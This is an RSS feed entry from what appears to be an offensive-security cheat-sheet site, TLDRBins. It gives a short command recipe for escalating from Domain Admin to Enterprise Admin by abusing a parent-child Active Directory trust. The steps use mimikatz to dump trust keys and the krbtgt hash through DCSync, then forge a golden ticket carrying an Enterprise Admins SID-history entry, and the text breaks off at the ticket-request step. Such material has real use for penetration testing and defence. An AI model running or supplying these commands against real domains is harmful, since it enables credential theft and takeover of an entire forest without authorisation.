channel.title: Ea on TLDRBins
channel.description: Recent content in Ea on TLDRBins

item.title: Abuse Parent Child Domain Trusts
item.description: Privesc from DA to EA Check direction and target Get-ADTrust -Filter * # Or nltest /domain_trusts # Or ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() Get current and target domain SID ./mimikatz.exe 'lsadump::trust' 'exit' Get krbtgt hash of current domain ./mimikatz.exe 'lsadump::dcsync /all /csv' 'exit' Forge a golden ticket # Append '-519' to target domain SID ./mimikatz.exe 'kerberos::golden /user:Administrator /rc4:<HASH> /domain:CURRENT.EXAMPLE.COM /sid:<CURRENT_DOMAIN_SID> /sids:<TARGET_DOMAIN_SID>-519 /ticket:c:\windows\tasks\ticket.kirbi' 'exit' Note: May need to try different high value hashes Request a tgt ticket of target domain .
